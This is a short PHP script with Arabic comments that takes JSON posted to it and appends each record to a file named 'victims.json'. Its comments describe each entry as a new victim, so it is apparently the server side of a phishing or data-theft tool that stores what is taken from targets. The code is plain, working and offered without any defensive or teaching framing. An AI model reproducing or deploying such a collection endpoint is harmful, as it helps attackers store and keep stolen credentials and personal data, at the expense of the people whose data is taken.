<?php
header("Content-Type: application/json");

// استقبال البيانات JSON
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    // تحميل البيانات الحالية من victims.json
    $file = "victims.json";
    $victims = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

    // إضافة الضحية الجديدة
    $victims[] = $data;

    // حفظ التحديث
    file_put_contents($file, json_encode($victims, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    echo json_encode(["status" => "success", "message" => "تم الحفظ"]);
} else {
    echo json_encode(["status" => "error", "message" => "لم تصل بيانات"]);
}
?>
